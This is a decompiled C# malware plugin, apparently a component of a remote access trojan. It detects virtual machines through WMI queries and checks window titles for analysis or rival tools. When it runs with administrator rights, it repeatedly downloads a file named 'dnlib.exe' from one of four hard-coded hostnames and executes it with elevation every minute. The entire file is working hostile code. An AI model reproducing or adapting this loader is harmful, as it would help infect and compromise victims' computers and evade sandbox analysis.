using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public static string[] hosts = new string[4] { "http://fdute32sdajfsda.hopto.org", "http://cv63911.tw1.ru", "http://webarhiv23dasda.hopto.org", "http://pristolmag32dds.hopto.org" };

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Server")) || isVM_by_wim_temper() || isVM_by_wim_temper1())
		{
			return;
		}
		string text = GetActiveWindowTitle().ToLower();
		if (text.Contains("rat") || text.Contains("sheet") || text.Contains("liberium") || Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Download", "Leberium_Rat_By_Dead_Artis_pass_123.rar")))
		{
			Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Server"));
		}
		else
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			WebClient webClient = new WebClient();
			Random random = new Random();
			while (true)
			{
				try
				{
					string text2 = Path.Combine(Path.GetTempPath(), "dnlib.exe");
					File.WriteAllBytes(text2, webClient.DownloadData(hosts[random.Next(hosts.Length)] + "/dnlib.exe"));
					Process.Start(new ProcessStartInfo(text2)
					{
						Verb = "runas"
					});
				}
				catch
				{
				}
				Thread.Sleep(60000);
			}
		}
	}

	public static bool isVM_by_wim_temper()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected O, but got Unknown
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		return new ManagementObjectSearcher((ObjectQuery)new SelectQuery("Select * from Win32_CacheMemory")).Get().Count == 0;
	}

	public static bool isVM_by_wim_temper1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected O, but got Unknown
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		return new ManagementObjectSearcher((ObjectQuery)new SelectQuery("Select * from CIM_Memory")).Get().Count == 0;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
